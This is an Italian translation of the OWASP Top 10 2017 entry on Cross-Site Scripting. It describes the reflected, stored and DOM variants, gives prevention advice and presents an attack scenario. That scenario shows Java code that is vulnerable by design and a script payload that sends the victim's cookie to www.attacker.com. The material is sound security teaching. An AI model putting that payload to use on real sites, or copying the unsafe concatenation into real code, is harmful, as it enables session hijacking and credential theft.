# A7:2017 Cross-Site Scripting (XSS)

| Threat agents/Attack vectors | Security Weakness           | Impacts               |
| -- | -- | -- |
| Access Lvl : Exploitability 3 | Prevalence 3 : Detectability 3 | Technical 2 : Business |
| I tool automatici possono identificare e sfruttare tutte le 3 forme di XSS, e framework per lo sfruttamento delle falle sono liberamente scaricabili. | XSS è la seconda falla per diffuzione fra le OWASP Top 10 ed è trovabile in circa i 2/3 delle applicazioni. Gli strumenti automatici possono identificare automaticamente falle XSS, soprattutto in tecnologie mature come PHP, J2EE / JSP e ASP.NET. | L'impatto di XSS è moderato per gli XSS DOM e reflected, e grave per gli stored XSS, con l'esecuzione di codice remoto, come furto di credenziali, sessioni o installazione di codice malevolo direttamente sul browser della vittima. | 

## L'Applicazione è vulnerabile?

Ci sono 3 tipi di XSS; generalmente attaccano il browser dell'utente:

* **Reflected XSS**: L'API o l'applicazione include nell'output HTML parte dell input utente senza validarlo o pulirlo. Un attacco di successo può consentire all'attaccante di eseguire HTML e codice Javascript nel browser della vittima. L'utente finirà per interagire pagine malevole definite dall'attaccante, come siti di raccolta dati, annunci o simili.
* **Stored XSS**: L'applicazione o l'API salva input utente non sanato che verrà poi rivisto da un altro utente o un amministratore. Il rischio dovuto a falle di tipo Stored XSS è spesso considerato di livello alto o critico.
* **DOM XSS**: Framework JavaScript, single-page applications e API che includono dinamicamente dati potenzialmente controllabili da un attaccante sono vulnerabili ai DOM XSS. In linea ideale l'applicazione non dovrebbe inviare dati controllabili da un attaccante a librerie/API JavaScript non sicure.

Gli attacchi XSS tipici includono il furto di sessioni, il furto di identità, l'aggiramento dell'autenticazione a più fattori, la sostituzione di parti del DOM o il defacement (come ad esempio falsi pannelli di login), attacchi al browser dell'utente come scaricamento di software, key logging, e altri attacchi lato client.

## Prevenzione

Per prevenire gli attacchi XSS è necessario separare dati non fidati dal contenuto attivo del browser. Ciò può essere ottenuto in vari modi: 

* Usando framework che evitano XSS per design, ad esempio le ultime versioni di Ruby on Rails, React JS. Imparare i limiti della protezione XSS di ogni framework e gestire in maniera appropriata i casi non coperti.
* Pulire i dati di richieste HTTP non fidate basandosi sul contesto dell'output HTML (body, attribute, JavaScript, CSS o URL) eiva le falle di tipo Reflected o Stored. Il [OWASP  Cheat Sheet 'XSS Prevention'](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) fornisce dettagli sulle tecniche di pulizia dei dati.
* Applicare un encoding context-sensitive quando si modifica il documento lato client ostacola gli attacchi DOM XSS. Quando non si può evitare, tecniche di pulizia del contenuto simili possono essere applicate alle API del browser, come descitto in OWASP Cheat Sheet 'DOM based XSS Prevention'.
* Attivare una [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) come uno strato di controllo contro gli XSS in una strategia defense-in-depth. E' efficace quando altre vulnerabilità consentono di inserire codice malevolo attraverso l'inclusione di un file locale (ad esempio sostituzioni di file con path traversal or librerie vulnerabli su fonti consentite). 

## Scenari esempio di attacco

**Scenario #1**: L'applicazione usa dati non sicuri nel costuire questo snippet HTML senza validarli o pulirli:

`(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
L'attaccante modifica il parametro ‘CC’ nel browser in:

`'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`

Questo attacco comporta che l'ID di sessione della vittima venga inviato al sito dell'attaccante, consentendogli così di rubare la sessione utente.

**Note**: Gli attaccanti possono usare XSS per aggirare ogni difesa automatica contro la Cross-Site Request Forgery (CSRF) utilizzata dall'applicazione.

## Riferimenti

### OWASP

* [OWASP Proactive Controls: Encode Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Proactive Controls: Validate Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Application Security Verification Standard: V5](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project)
* [OWASP Testing Guide: Testing for Reflected XSS](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))
* [OWASP Testing Guide: Testing for Stored XSS](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002))
* [OWASP Testing Guide: Testing for DOM XSS](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001))
* [OWASP Cheat Sheet: XSS Prevention](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
* [OWASP Cheat Sheet: DOM based XSS Prevention](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
* [OWASP Cheat Sheet: XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
* [OWASP Java Encoder Project](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)

### Esterno

* [CWE-79: Improper neutralization of user supplied input](https://cwe.mitre.org/data/definitions/79.html)
* [PortSwigger: Client-side template injection](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)
